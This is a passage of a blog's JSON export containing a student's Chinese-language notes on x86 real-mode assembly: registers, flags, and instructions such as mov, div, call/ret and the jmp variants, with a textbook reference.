jmp\n\n若JMP之后是标号，则编译为相对转移指令0xE9，操作数为相对偏移题，执行时IP+操作数+长度，此时为相对近转移\n8086处理器的无条件转移指令（“16位”意为要转移到的目标位置的偏移地址是16位的）\n\n1. 相对短转移。操作码为0xEB，操作数是相对于目标位置的偏移量，仅1字节，且为有符号数，故该指令属于段内转移指令，且只允许转移到距离当前-128~127字节的地方，该指令须使用关键字“short”，例：\n    jmp shor infinite\n2. 16位相对近转移。转移范围较相对短转移稍大，操作码为0xE9，操作数为2字节，属于段内转移，可转移到距当前指令-32768~32767字节的地方，该指令应使用关键字“near”\n3. 16位间接绝对近转移。转移到的目标偏移地址不是在指令中直接给出，而是用一个16位的通用寄存器或者内存地址间接给出，关键字“near“可以省略，例：\n    jmp near bx\n    jmp near cx\n    jump_dest dw 0xc000\n    jmp [jump_dest]\n    jmp [bx]\n4. 16位直接绝对远转移。在指令中直接给出段地址和偏移地址的转移指令，例：\n    jmp 0x0000:0x7c00\n5. 16位间接绝对远转移。该指令要使用关键字”far”，例：\n    jump_far dw 0x33c0,0xf000\n    jmp far [jump_far]\n\n**resb**（REServe Byte）、resw和resd指令\n**resb**:从当前位置开始，保留指定数量的字节，但不进行初始化\n\n### mul\n\n可以用8位的通用寄存器或者内存单元中的数和寄存器AL中的内容相乘，结果是16位，在AX寄存器中，也可以用16位的通用寄存器或者内存单元中的数和寄存器AX中的内容相乘，结果是32位，高16位和低16位分别在DX和AX中，指令执行后，若结果的高一半全为0，则OF和CF清零，否则置1\n\n## 参考\n\n《x86汇编语言——从实模式到保护模式》——李忠 著\n","slug":"汇编学习笔记","published":1,"updated":"2024-06-03T06:41:13.402Z","_id":"cl8wgpppe001kck6g55b22szw","comments":1,"layout":"post","photos":[],"content":"<p>进行一些笔记的整理</p>\n<span id=\"more\"></span>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>上年暑假就学了 x86 汇编的实模式部分，当时用 Onenote 记了一些笔记，后来发现了 Markdown 这个好东西，就决定搬迁一下，也方便我上课查（bushi</p>\n<p>格式有待整理（逃</p>\n<h2 id=\"寄存器\"><a href=\"#寄存器\" class=\"headerlink\" title=\"寄存器\"></a>寄存器</h2><h3 id=\"通用寄存器\"><a href=\"#通用寄存器\" class=\"headerlink\" title=\"通用寄存器\"></a>通用寄存器</h3><table>\n<thead>\n<tr>\n<th align=\"center\">寄存器</th>\n<th align=\"center\">全称</th>\n<th align=\"center\">中文名称</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CS</td>\n<td align=\"center\">Code Segment</td>\n<td align=\"center\">代码段寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">DS</td>\n<td align=\"center\">Data Segment</td>\n<td align=\"center\">数据段寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">ES</td>\n<td align=\"center\">Extra Segment</td>\n<td align=\"center\">附加段寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">SS</td>\n<td align=\"center\">Stack Segment</td>\n<td align=\"center\">栈段</td>\n</tr>\n<tr>\n<td align=\"center\">SP</td>\n<td align=\"center\">Stack Pointer</td>\n<td align=\"center\">栈指针寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">IP</td>\n<td align=\"center\">Instruction Pointer</td>\n<td align=\"center\">指令指针寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">SI</td>\n<td align=\"center\">Source Index</td>\n<td align=\"center\">源索引（变址）寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">DI</td>\n<td align=\"center\">Destination Index</td>\n<td align=\"center\">目标索引寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">AX</td>\n<td align=\"center\">Accumulator</td>\n<td align=\"center\">累加器</td>\n</tr>\n<tr>\n<td align=\"center\">BX</td>\n<td align=\"center\">Base Address Register</td>\n<td align=\"center\">基地址寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">CX</td>\n<td align=\"center\">Counter</td>\n<td align=\"center\">计数器</td>\n</tr>\n<tr>\n<td align=\"center\">DX</td>\n<td align=\"center\">Data</td>\n<td align=\"center\">数据寄存器</td>\n</tr>\n</tbody></table>\n<h3 id=\"标志寄存器\"><a href=\"#标志寄存器\" class=\"headerlink\" title=\"标志寄存器\"></a>标志寄存器</h3><table>\n<thead>\n<tr>\n<th align=\"center\">Index</th>\n<th align=\"center\">名称</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">第0位</td>\n<td align=\"center\">CF</td>\n<td align=\"center\">进位标志，进行算术操作时，如果最高位有向前进位或借位的情况发生，则CF=1，否则CF=0，少数指令除外（如inc和dec）</td>\n</tr>\n<tr>\n<td align=\"center\">第2位</td>\n<td align=\"center\">PF</td>\n<td align=\"center\">奇偶标志，运算结果最低8位，有偶数个为1的比特则PF=1，否则PF=0</td>\n</tr>\n<tr>\n<td align=\"center\">第4位</td>\n<td align=\"center\">AF</td>\n<td align=\"center\">无</td>\n</tr>\n<tr>\n<td align=\"center\">第6位</td>\n<td align=\"center\">ZF（Zero Flag）</td>\n<td align=\"center\">零标志，当处理器执行一条算数或者逻辑运算指令后，抓住逻辑部件送出的结果除了送到指令中指定位置，还送到一个或非门，如果计算结果为0，ZF被置成1，表示计算结果为零是“真”的，否则清除此位（0）</td>\n</tr>\n<tr>\n<td align=\"center\">第7位</td>\n<td align=\"center\">SF（Sign Flag）</td>\n<td align=\"center\">符号位，如dec计算结果的最高位是比特“0”，SF置“0”，否则置“1”</td>\n</tr>\n<tr>\n<td align=\"center\">第8位</td>\n<td align=\"center\">TF</td>\n<td align=\"center\">无</td>\n</tr>\n<tr>\n<td align=\"center\">第9位</td>\n<td align=\"center\">IF</td>\n<td align=\"center\">无</td>\n</tr>\n<tr>\n<td align=\"center\">第10位</td>\n<td align=\"center\">DF（Direction Flag）</td>\n<td align=\"center\">方向标志，可控制movsb和movsw的传送方向</td>\n</tr>\n<tr>\n<td align=\"center\">第11位</td>\n<td align=\"center\">OF</td>\n<td align=\"center\">即溢出标志，用于指示两个有符号数的运算结果是否错误，如果结果正确，则OF=0，否则OF=1</td>\n</tr>\n</tbody></table>\n<h2 id=\"指令\"><a href=\"#指令\" class=\"headerlink\" title=\"指令\"></a>指令</h2><h3 id=\"mov\"><a href=\"#mov\" class=\"headerlink\" title=\"mov\"></a>mov</h3><p>示例：<br>mov ah,bh<br>mov ax,dx<br>mov [0x02],bl<br>mov ax,[0x06]<br>mov ah,0x05<br>mov word [0x1c],0xf000</p>\n<h3 id=\"db（Declare-Byte）\"><a href=\"#db（Declare-Byte）\" class=\"headerlink\" title=\"db（Declare Byte）\"></a>db（Declare Byte）</h3><p>伪指令，跟在后面的操作数都占一个字节的长度，如果要声明超过一个以上的数据，各个操作数之间必须以逗号隔开</p>\n<h3 id=\"div\"><a href=\"#div\" class=\"headerlink\" title=\"div\"></a>div</h3><ol>\n<li>用16位的二进制数除以8位的二进制数：<br>被除数必须在寄存器AX中，必须先传送到AX寄存器里，除数可以由8位的通用寄存器或者内存单元提供<br>执行后：商在AL中，余数在AH中</li>\n<li>用32位的二进制数除以16位的二进制数：<br>被除数的高16位在DX中，低16位在AX中<br>执行后：商在AX中，余数在DX中</li>\n</ol>\n<h3 id=\"xor\"><a href=\"#xor\" class=\"headerlink\" title=\"xor\"></a>xor</h3><p>0 xor 0 = 0<br>0 xor 1 = 1<br>1 xor 0 = 1<br>1 xor 1 = 0<br>常用于清零</p>\n<h3 id=\"times\"><a href=\"#times\" class=\"headerlink\" title=\"times\"></a>times</h3><p>伪指令，重复后面的指令若干次<br>例：times 100 db 0</p>\n<h3 id=\"movsb和movsw\"><a href=\"#movsb和movsw\" class=\"headerlink\" title=\"movsb和movsw\"></a>movsb和movsw</h3><p>原始数据串的段地址由 DS 指定，偏移地址由 SI 指定，简写为 DS：SI ，目的地址为 ES：DI ，传送的字节数或者字数由 CX 指定，每传送一次， CX 内容减一<br>正向传送时传送操作方向是从内存区域低地址端到高地址端，每传送一个字节或一个字时， SI 和 DI 加 1 或者加 2 ，反向传送则相反</p>\n<h3 id=\"cld和std\"><a href=\"#cld和std\" class=\"headerlink\" title=\"cld和std\"></a>cld和std</h3><p><strong>cld</strong>:将 DF 标志清零，指示传送是正方向的<br><strong>std</strong>:与 <code>cld</code> 相反</p>\n<h3 id=\"loop\"><a href=\"#loop\" class=\"headerlink\" title=\"loop\"></a>loop</h3><p>执行时 CX 减一，若 CX 内容不为零，转移到指定的位置执行，否则顺序后面的指令</p>\n<h3 id=\"rep\"><a href=\"#rep\" class=\"headerlink\" title=\"rep\"></a>rep</h3><p>指令前缀，即 repeat<br>CX 不为零则重复</p>\n<h3 id=\"inc和dec\"><a href=\"#inc和dec\" class=\"headerlink\" title=\"inc和dec\"></a>inc和dec</h3><p><strong>inc</strong>:加一指令，<code>inc bx</code> 和 <code>add bx,1</code> 功能一样，但前者机器码更短，速度更快<br><strong>dec</strong>:减一指令，与 <code>inc</code> 格式相同</p>\n<h3 id=\"neg\"><a href=\"#neg\" class=\"headerlink\" title=\"neg\"></a>neg</h3><p>用 0 减去指令中指定的操作数</p>\n<h3 id=\"cbw和cwd\"><a href=\"#cbw和cwd\" class=\"headerlink\" title=\"cbw和cwd\"></a>cbw和cwd</h3><p>两条指令后都没有操作数<br><strong>cbw</strong>（Convert Byte to Word）：将 AL 中的有符号数扩展到整个 AX<br><strong>cwd</strong>（Convert Word to Double-word）：将 AX 中的有符号数扩展到 DX：AX 中</p>\n<h3 id=\"idiv\"><a href=\"#idiv\" class=\"headerlink\" title=\"idiv\"></a>idiv</h3><p>div 为无符号除尘指令（Unsigned Divide）<br>idiv 指令格式与 div 相同，专门用于计算有符号数</p>\n<h3 id=\"sub\"><a href=\"#sub\" class=\"headerlink\" title=\"sub\"></a>sub</h3><p>与加法指令 <code>add</code> 类似，但处理器没有减法运算电路，故 <code>sub ah,al</code> 等效<br>neg al<br>add ah,al</p>\n<h3 id=\"cmp\"><a href=\"#cmp\" class=\"headerlink\" title=\"cmp\"></a>cmp</h3><p>功能上和 <code>sub</code> 指令相同，但仅影响相应标志位（CF、OF、SF、ZF、AF和PF），而不保留计算结果，因此不会改变两个操作数的原有内容</p>\n<h3 id=\"or和and\"><a href=\"#or和and\" class=\"headerlink\" title=\"or和and\"></a>or和and</h3><table>\n<thead>\n<tr>\n<th>or</th>\n<th>and</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0 xor 0 = 0</td>\n<td>0 xor 0 = 0</td>\n</tr>\n<tr>\n<td>0 xor 1 = 1</td>\n<td>0 xor 1 = 0</td>\n</tr>\n<tr>\n<td>1 xor 0 = 1</td>\n<td>1 xor 0 = 0</td>\n</tr>\n<tr>\n<td>1 xor 1 = 1</td>\n<td>1 xor 1 = 1</td>\n</tr>\n</tbody></table>\n<p>对标志寄存器影响： OF 和 CF 位被清零， SF、ZF、PF 的状态依计算结果而定</p>\n<h3 id=\"push和pop\"><a href=\"#push和pop\" class=\"headerlink\" title=\"push和pop\"></a>push和pop</h3><p>操作数可以是寄存器或者内存单元，逻辑地址为 SS：SP ，不影响任何标志位<br><strong>push</strong>：执行时将 SP 内容减去操作数的字长，从高地址端向低地址端推进<br><strong>pop</strong>：执行时将 SP 内容加上操作数的字长</p>\n<h3 id=\"in和out\"><a href=\"#in和out\" class=\"headerlink\" title=\"in和out\"></a>in和out</h3><p><code>in</code> 指令是从端口读，一般形式是<br>in al,dx<br>in ax,dx<br>in 指令的操作数必须是寄存器 AL 或者 AX ，用于访问 8 位或 16 位的端口，源操作数应当是寄存器 DX ， <code>in</code> 指令为 2 字节形式时，后一字节是立即数<br> <code>out</code> 指令和 <code>in</code> 指令相反<br>两个指令均不影响任何标志位</p>\n<h3 id=\"call、ref和retf指令\"><a href=\"#call、ref和retf指令\" class=\"headerlink\" title=\"call、ref和retf指令\"></a>call、ref和retf指令</h3><p>8086处理器支持四种调用方式<br>    i. 16位相对近调用。近调用的意思是被调用的目标过程位于当前代码段内，而非另一个不同的代码段，故只需得到偏移地址即可，计算过程为：用目标过程的汇编地址减去当前call指令的汇编地址，再减去当前call指令以字节为单位的长度(3)，保留16位的结果，近调用的特征是在指令中使用关键字”near”，若没有提供任何关键字，则编译器认为该指令是近调用，其机器指令操作数是一个16位的有符号数，被调用过程的首地址必须位于距离当前call指令-32768~32767字节的地方<br>    ii. 16位间接绝对近调用。这种调用也是近调用，只能调用当前代码段内的过程，指令中的操作数不是偏移量，而是被调用过程的真实偏移地址，故称为绝对地址，该偏移地址不直接出现在指令中，而是由16位的通用寄存器或者16位的内存单元间接提供，机器指令的操作是16位的绝对地址，故可以调用当前代码段任何位置处的过程<br>    iii. 16位直接绝对远调用。这种调用属于段间调用，即调用另一个代码段的过程，”16位”是针对偏移地址来说的，而不是限定段地址，”直接”的意思，段地接和偏移地址直接在call指令中给出，先后将CS和IP进行压栈和出栈<br>    iv. 16位间接绝对远调用。同样属于段间调用，”16位”同样用于限定偏移地址，必须使用关键字”far”，例：<br>        proc_1 dw 0x0102,0x2000<br>        call far [proc_1]<br>    0x0102是偏移地址，0x2000是段地址，指令执行时，处理器访问DS指向的数据段，从指令中指定的偏移地址处取得两个字（段地址0x2000和偏移地址0x0102），再将CS和IP分别压栈和取代<br>ref是近返回指令，从栈中弹出一个字到IP中<br>retf是远返回指令，分别从栈中弹出两个字到IP和CS中</p>\n<h3 id=\"shr、shl、ror、rol\"><a href=\"#shr、shl、ror、rol\" class=\"headerlink\" title=\"shr、shl、ror、rol\"></a>shr、shl、ror、rol</h3><p><strong>shr</strong>（Shift logical Right），即逻辑右移指令，将AX中的内容右移4位，执行时将操作数连续右移指定次数，每次溢出的比特被移到CF位，空出的位置用“0”填充，目的操作数可以是8位或16位通用寄存器/内存单元，源操作数可以是1或8位立即数或寄存器CL，当使用CL时，对于目的操作数是内存地址的情况，须使用关键字byte或word等来加限定，如：<br>    shr al,cl<br>    shr byte [bx],cl<br>ror（Rotate Right），即循环右移指令，执行时每右移一次，移出的比特既送到CF位，也送进左边空出的位</p>\n<h3 id=\"jmp\"><a href=\"#jmp\" class=\"headerlink\" title=\"jmp\"></a>jmp</h3><p>若JMP之后是标号，则编译为相对转移指令0xE9，操作数为相对偏移题，执行时IP+操作数+长度，此时为相对近转移<br>8086处理器的无条件转移指令（“16位”意为要转移到的目标位置的偏移地址是16位的）</p>\n<ol>\n<li>相对短转移。操作码为0xEB，操作数是相对于目标位置的偏移量，仅1字节，且为有符号数，故该指令属于段内转移指令，且只允许转移到距离当前-128~127字节的地方，该指令须使用关键字“short”，例：<br> jmp shor infinite</li>\n<li>16位相对近转移。转移范围较相对短转移稍大，操作码为0xE9，操作数为2字节，属于段内转移，可转移到距当前指令-32768~32767字节的地方，该指令应使用关键字“near”</li>\n<li>16位间接绝对近转移。转移到的目标偏移地址不是在指令中直接给出，而是用一个16位的通用寄存器或者内存地址间接给出，关键字“near“可以省略，例：<br> jmp near bx<br> jmp near cx<br> jump_dest dw 0xc000<br> jmp [jump_dest]<br> jmp [bx]</li>\n<li>16位直接绝对远转移。在指令中直接给出段地址和偏移地址的转移指令，例：<br> jmp 0x0000:0x7c00</li>\n<li>16位间接绝对远转移。该指令要使用关键字”far”，例：<br> jump_far dw 0x33c0,0xf000<br> jmp far [jump_far]</li>\n</ol>\n<p><strong>resb</strong>（REServe Byte）、resw和resd指令<br><strong>resb</strong>:从当前位置开始，保留指定数量的字节，但不进行初始化</p>\n<h3 id=\"mul\"><a href=\"#mul\" class=\"headerlink\" title=\"mul\"></a>mul</h3><p>可以用8位的通用寄存器或者内存单元中的数和寄存器AL中的内容相乘，结果是16位，在AX寄存器中，也可以用16位的通用寄存器或者内存单元中的数和寄存器AX中的内容相乘，结果是32位，高16位和低16位分别在DX和AX中，指令执行后，若结果的高一半全为0，则OF和CF清零，否则置1</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p>《x86汇编语言——从实模式到保护模式》——李忠 著</p>\n","excerpt":"<p>进行一些笔记的整理</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>上年暑假就学了 x86 汇编的实模式部分，当时用 Onenote 记了一些笔记，后来发现了 Markdown 这个好东西，就决定搬迁一下，也方便我上课查（bushi</p>\n<p>格式有待整理（逃</p>\n<h2 id=\"寄存器\"><a href=\"#寄存器\" class=\"headerlink\" title=\"寄存器\"></a>寄存器</h2><h3 id=\"通用寄存器\"><a href=\"#通用寄存器\" class=\"headerlink\" title=\"通用寄存器\"></a>通用寄存器</h3><table>\n<thead>\n<tr>\n<th align=\"center\">寄存器</th>\n<th align=\"center\">全称</th>\n<th align=\"center\">中文名称</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CS</td>\n<td align=\"center\">Code Segment</td>\n<td align=\"center\">代码段寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">DS</td>\n<td align=\"center\">Data Segment</td>\n<td align=\"center\">数据段寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">ES</td>\n<td align=\"center\">Extra Segment</td>\n<td align=\"center\">附加段寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">SS</td>\n<td align=\"center\">Stack Segment</td>\n<td align=\"center\">栈段</td>\n</tr>\n<tr>\n<td align=\"center\">SP</td>\n<td align=\"center\">Stack Pointer</td>\n<td align=\"center\">栈指针寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">IP</td>\n<td align=\"center\">Instruction Pointer</td>\n<td align=\"center\">指令指针寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">SI</td>\n<td align=\"center\">Source Index</td>\n<td align=\"center\">源索引（变址）寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">DI</td>\n<td align=\"center\">Destination Index</td>\n<td align=\"center\">目标索引寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">AX</td>\n<td align=\"center\">Accumulator</td>\n<td align=\"center\">累加器</td>\n</tr>\n<tr>\n<td align=\"center\">BX</td>\n<td align=\"center\">Base Address Register</td>\n<td align=\"center\">基地址寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">CX</td>\n<td align=\"center\">Counter</td>\n<td align=\"center\">计数器</td>\n</tr>\n<tr>\n<td align=\"center\">DX</td>\n<td align=\"center\">Data</td>\n<td align=\"center\">数据寄存器</td>\n</tr>\n</tbody></table>\n<h3 id=\"标志寄存器\"><a href=\"#标志寄存器\" class=\"headerlink\" title=\"标志寄存器\"></a>标志寄存器</h3><table>\n<thead>\n<tr>\n<th align=\"center\">Index</th>\n<th align=\"center\">名称</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">第0位</td>\n<td align=\"center\">CF</td>\n<td align=\"center\">进位标志，进行算术操作时，如果最高位有向前进位或借位的情况发生，则CF=1，否则CF=0，少数指令除外（如inc和dec）</td>\n</tr>\n<tr>\n<td align=\"center\">第2位</td>\n<td align=\"center\">PF</td>\n<td align=\"center\">奇偶标志，运算结果最低8位，有偶数个为1的比特则PF=1，否则PF=0</td>\n</tr>\n<tr>\n<td align=\"center\">第4位</td>\n<td align=\"center\">AF</td>\n<td align=\"center\">无</td>\n</tr>\n<tr>\n<td align=\"center\">第6位</td>\n<td align=\"center\">ZF（Zero Flag）</td>\n<td align=\"center\">零标志，当处理器执行一条算数或者逻辑运算指令后，抓住逻辑部件送出的结果除了送到指令中指定位置，还送到一个或非门，如果计算结果为0，ZF被置成1，表示计算结果为零是“真”的，否则清除此位（0）</td>\n</tr>\n<tr>\n<td align=\"center\">第7位</td>\n<td align=\"center\">SF（Sign Flag）</td>\n<td align=\"center\">符号位，如dec计算结果的最高位是比特“0”，SF置“0”，否则置“1”</td>\n</tr>\n<tr>\n<td align=\"center\">第8位</td>\n<td align=\"center\">TF</td>\n<td align=\"center\">无</td>\n</tr>\n<tr>\n<td align=\"center\">第9位</td>\n<td align=\"center\">IF</td>\n<td align=\"center\">无</td>\n</tr>\n<tr>\n<td align=\"center\">第10位</td>\n<td align=\"center\">DF（Direction Flag）</td>\n<td align=\"center\">方向标志，可控制movsb和movsw的传送方向</td>\n</tr>\n<tr>\n<td align=\"center\">第11位</td>\n<td align=\"center\">OF</td>\n<td align=\"center\">即溢出标志，用于指示两个有符号数的运算结果是否错误，如果结果正确，则OF=0，否则OF=1</td>\n</tr>\n</tbody></table>\n<h2 id=\"指令\"><a href=\"#指令\" class=\"headerlink\" title=\"指令\"></a>指令</h2><h3 id=\"mov\"><a href=\"#mov\" class=\"headerlink\" title=\"mov\"></a>mov</h3><p>示例：<br>mov ah,bh<br>mov ax,dx<br>mov [0x02],bl<br>mov ax,[0x06]<br>mov ah,0x05<br>mov word [0x1c],0xf000</p>\n<h3 id=\"db（Declare-Byte）\"><a href=\"#db（Declare-Byte）\" class=\"headerlink\" title=\"db（Declare Byte）\"></a>db（Declare Byte）</h3><p>伪指令，跟在后面的操作数都占一个字节的长度，如果要声明超过一个以上的数据，各个操作数之间必须以逗号隔开</p>\n<h3 id=\"div\"><a href=\"#div\" class=\"headerlink\" title=\"div\"></a>div</h3><ol>\n<li>用16位的二进制数除以8位的二进制数：<br>被除数必须在寄存器AX中，必须先传送到AX寄存器里，除数可以由8位的通用寄存器或者内存单元提供<br>执行后：商在AL中，余数在AH中</li>\n<li>用32位的二进制数除以16位的二进制数：<br>被除数的高16位在DX中，低16位在AX中<br>执行后：商在AX中，余数在DX中</li>\n</ol>\n<h3 id=\"xor\"><a href=\"#xor\" class=\"headerlink\" title=\"xor\"></a>xor</h3><p>0 xor 0 = 0<br>0 xor 1 = 1<br>1 xor 0 = 1<br>1 xor 1 = 0<br>常用于清零</p>\n<h3 id=\"times\"><a href=\"#times\" class=\"headerlink\" title=\"times\"></a>times</h3><p>伪指令，重复后面的指令若干次<br>例：times 100 db 0</p>\n<h3 id=\"movsb和movsw\"><a href=\"#movsb和movsw\" class=\"headerlink\" title=\"movsb和movsw\"></a>movsb和movsw</h3><p>原始数据串的段地址由 DS 指定，偏移地址由 SI 指定，简写为 DS：SI ，目的地址为 ES：DI ，传送的字节数或者字数由 CX 指定，每传送一次， CX 内容减一<br>正向传送时传送操作方向是从内存区域低地址端到高地址端，每传送一个字节或一个字时， SI 和 DI 加 1 或者加 2 ，反向传送则相反</p>\n<h3 id=\"cld和std\"><a href=\"#cld和std\" class=\"headerlink\" title=\"cld和std\"></a>cld和std</h3><p><strong>cld</strong>:将 DF 标志清零，指示传送是正方向的<br><strong>std</strong>:与 <code>cld</code> 相反</p>\n<h3 id=\"loop\"><a href=\"#loop\" class=\"headerlink\" title=\"loop\"></a>loop</h3><p>执行时 CX 减一，若 CX 内容不为零，转移到指定的位置执行，否则顺序后面的指令</p>\n<h3 id=\"rep\"><a href=\"#rep\" class=\"headerlink\" title=\"rep\"></a>rep</h3><p>指令前缀，即 repeat<br>CX 不为零则重复</p>\n<h3 id=\"inc和dec\"><a href=\"#inc和dec\" class=\"headerlink\" title=\"inc和dec\"></a>inc和dec</h3><p><strong>inc</strong>:加一指令，<code>inc bx</code> 和 <code>add bx,1</code> 功能一样，但前者机器码更短，速度更快<br><strong>dec</strong>:减一指令，与 <code>inc</code> 格式相同</p>\n<h3 id=\"neg\"><a href=\"#neg\" class=\"headerlink\" title=\"neg\"></a>neg</h3><p>用 0 减去指令中指定的操作数</p>\n<h3 id=\"cbw和cwd\"><a href=\"#cbw和cwd\" class=\"headerlink\" title=\"cbw和cwd\"></a>cbw和cwd</h3><p>两条指令后都没有操作数<br><strong>cbw</strong>（Convert Byte to Word）：将 AL 中的有符号数扩展到整个 AX<br><strong>cwd</strong>（Convert Word to Double-word）：将 AX 中的有符号数扩展到 DX：AX 中</p>\n<h3 id=\"idiv\"><a href=\"#idiv\" class=\"headerlink\" title=\"idiv\"></a>idiv</h3><p>div 为无符号除尘指令（Unsigned Divide）<br>idiv 指令格式与 div 相同，专门用于计算有符号数</p>\n<h3 id=\"sub\"><a href=\"#sub\" class=\"headerlink\" title=\"sub\"></a>sub</h3><p>与加法指令 <code>add</code> 类似，但处理器没有减法运算电路，故 <code>sub ah,al</code> 等效<br>neg al<br>add ah,al</p>\n<h3 id=\"cmp\"><a href=\"#cmp\" class=\"headerlink\" title=\"cmp\"></a>cmp</h3><p>功能上和 <code>sub</code> 指令相同，但仅影响相应标志位（CF、OF、SF、ZF、AF和PF），而不保留计算结果，因此不会改变两个操作数的原有内容</p>\n<h3 id=\"or和and\"><a href=\"#or和and\" class=\"headerlink\" title=\"or和and\"></a>or和and</h3><table>\n<thead>\n<tr>\n<th>or</th>\n<th>and</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0 xor 0 = 0</td>\n<td>0 xor 0 = 0</td>\n</tr>\n<tr>\n<td>0 xor 1 = 1</td>\n<td>0 xor 1 = 0</td>\n</tr>\n<tr>\n<td>1 xor 0 = 1</td>\n<td>1 xor 0 = 0</td>\n</tr>\n<tr>\n<td>1 xor 1 = 1</td>\n<td>1 xor 1 = 1</td>\n</tr>\n</tbody></table>\n<p>对标志寄存器影响： OF 和 CF 位被清零， SF、ZF、PF 的状态依计算结果而定</p>\n<h3 id=\"push和pop\"><a href=\"#push和pop\" class=\"headerlink\" title=\"push和pop\"></a>push和pop</h3><p>操作数可以是寄存器或者内存单元，逻辑地址为 SS：SP ，不影响任何标志位<br><strong>push</strong>：执行时将 SP 内容减去操作数的字长，从高地址端向低地址端推进<br><strong>pop</strong>：执行时将 SP 内容加上操作数的字长</p>\n<h3 id=\"in和out\"><a href=\"#in和out\" class=\"headerlink\" title=\"in和out\"></a>in和out</h3><p><code>in</code> 指令是从端口读，一般形式是<br>in al,dx<br>in ax,dx<br>in 指令的操作数必须是寄存器 AL 或者 AX ，用于访问 8 位或 16 位的端口，源操作数应当是寄存器 DX ， <code>in</code> 指令为 2 字节形式时，后一字节是立即数<br> <code>out</code> 指令和 <code>in</code> 指令相反<br>两个指令均不影响任何标志位</p>\n<h3 id=\"call、ref和retf指令\"><a href=\"#call、ref和retf指令\" class=\"headerlink\" title=\"call、ref和retf指令\"></a>call、ref和retf指令</h3><p>8086处理器支持四种调用方式<br>    i. 16位相对近调用。近调用的意思是被调用的目标过程位于当前代码段内，而非另一个不同的代码段，故只需得到偏移地址即可，计算过程为：用目标过程的汇编地址减去当前call指令的汇编地址，再减去当前call指令以字节为单位的长度(3)，保留16位的结果，近调用的特征是在指令中使用关键字”near”，若没有提供任何关键字，则编译器认为该指令是近调用，其机器指令操作数是一个16位的有符号数，被调用过程的首地址必须位于距离当前call指令-32768~32767字节的地方<br>    ii. 16位间接绝对近调用。这种调用也是近调用，只能调用当前代码段内的过程，指令中的操作数不是偏移量，而是被调用过程的真实偏移地址，故称为绝对地址，该偏移地址不直接出现在指令中，而是由16位的通用寄存器或者16位的内存单元间接提供，机器指令的操作是16位的绝对地址，故可以调用当前代码段任何位置处的过程<br>    iii. 16位直接绝对远调用。这种调用属于段间调用，即调用另一个代码段的过程，”16位”是针对偏移地址来说的，而不是限定段地址，”直接”的意思，段地接和偏移地址直接在call指令中给出，先后将CS和IP进行压栈和出栈<br>    iv. 16位间接绝对远调用。同样属于段间调用，”16位”同样用于限定偏移地址，必须使用关键字”far”，例：<br>        proc_1 dw 0x0102,0x2000<br>        call far [proc_1]<br>    0x0102是偏移地址，0x2000是段地址，指令执行时，处理器访问DS指向的数据段，从指令中指定的偏移地址处取得两个字（段地址0x2000和偏移地址0x0102），再将CS和IP分别压栈和取代<br>ref是近返回指令，从栈中弹出一个字到IP中<br>retf是远返回指令，分别从栈中弹出两个字到IP和CS中</p>\n<h3 id=\"shr、shl、ror、rol\"><a href=\"#shr、shl、ror、rol\" class=\"headerlink\" title=\"shr、shl、ror、rol\"></a>shr、shl、ror、rol</h3><p><strong>shr</strong>（Shift logical Right），即逻辑右移指令，将AX中的内容右移4位，执行时将操作数连续右移指定次数，每次溢出的比特被移到CF位，空出的位置用“0”填充，目的操作数可以是8位或16位通用寄存器/内存单元，源操作数可以是1或8位立即数或寄存器CL，当使用CL时，对于目的操作数是内存地址的情况，须使用关键字byte或word等来加限定，如：<br>    shr al,cl<br>    shr byte [bx],cl<br>ror（Rotate Right），即循环右移指令，执行时每右移一次，移出的比特既送到CF位，也送进左边空出的位</p>\n<h3 id=\"jmp\"><a href=\"#jmp\" class=\"headerlink\" title=\"jmp\"></a>jmp</h3><p>若JMP之后是标号，则编译为相对转移指令0xE9，操作数为相对偏移题，执行时IP+操作数+长度，此时为相对近转移<br>8086处理器的无条件转移指令（“16位”意为要转移到的目标位置的偏移地址是16位的）</p>\n<ol>\n<li>相对短转移。操作码为0xEB，操作数是相对于目标位置的偏移量，仅1字节，且为有符号数，故该指令属于段内转移指令，且只允许转移到距离当前-128~127字节的地方，该指令须使用关键字“short”，例：<br> jmp shor infinite</li>\n<li>16位相对近转移。转移范围较相对短转移稍大，操作码为0xE9，操作数为2字节，属于段内转移，可转移到距当前指令-32768~32767字节的地方，该指令应使用关键字“near”</li>\n<li>16位间接绝对近转移。转移到的目标偏移地址不是在指令中直接给出，而是用一个16位的通用寄存器或者内存地址间接给出，关键字“near“可以省略，例：<br> jmp near bx<br> jmp near cx<br> jump_dest dw 0xc000<br> jmp [jump_dest]<br> jmp [bx]</li>\n<li>16位直接绝对远转移。在指令中直接给出段地址和偏移地址的转移指令，例：<br> jmp 0x0000:0x7c00</li>\n<li>16位间接绝对远转移。该指令要使用关键字”far”，例：<br> jump_far dw 0x33c0,0xf000<br> jmp far [jump_far]</li>\n</ol>\n<p><strong>resb</strong>（REServe Byte）、resw和resd指令<br><strong>resb</strong>:从当前位置开始，保留指定数量的字节，但不进行初始化</p>\n<h3 